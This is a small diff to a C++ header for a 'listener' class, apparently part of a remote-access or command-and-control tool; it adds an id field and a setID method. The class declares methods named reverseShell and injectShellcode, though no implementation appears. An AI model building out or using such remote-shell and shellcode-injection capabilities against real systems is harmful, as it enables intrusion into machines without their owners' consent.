@@ -21,6 +21,7 @@ class listener{
     public: 
 	char PORT[6];
 	int port;
+	int id;
 	int sockfd, new_fd;  
 	struct addrinfo hints, *servinfo, *p;
 	struct sockaddr_storage their_addr;
@@ -38,6 +39,7 @@ class listener{
     int uploadFile(string l_path, string r_path);
     int reverseShell();
 	int injectShellcode();
+	void setID(int pid);
 	string print();
 };
 
